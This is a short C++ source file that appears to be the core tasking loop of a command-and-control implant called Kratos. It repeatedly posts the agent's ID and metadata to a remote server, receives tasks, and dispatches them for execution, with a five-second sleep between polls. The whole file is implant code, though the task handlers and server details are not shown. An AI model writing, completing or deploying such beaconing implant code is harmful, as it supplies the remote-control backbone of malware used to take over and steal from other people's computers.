#include "agent/core.h"
#include "packager/packager.h"
#include "net/net.h"

Kratos* kratos = NULL;





BOOL Kratos::Run( ) {

	packager->NewPacker( );
	packager->PrepareMetaData( this->AgentID );
	const INT32 RequestBase = packager->PackerSize( );
	packager->Pack4( MSG_GETTASK );

	for ( ;; ) {
		DEBUG_LOG("[+] Getting Task");
		if ( ! net->Post( packager->PackerPointer( ), ( SIZE_T )packager->PackerSize() ) ) {
			return FALSE;
		}

		packager->NewUnPacker( net->Data( ), net->DataSize( ) );

		INT32 RespCode = packager->UnPack4( );
		if ( ! packager->ResetPackerIndex( RequestBase ) ) {
			return FALSE;
		}

		if ( RespCode != RESP_NO_TASKS ) {
			

			packager->Pack4( MSG_OUTPUT );
			this->Dispatch(  );
		}
		else {
			DEBUG_LOG("[+] No Task");
			packager->Pack4( MSG_GETTASK );
		}

		Sleep(5000);

		


	}



	return TRUE;
}



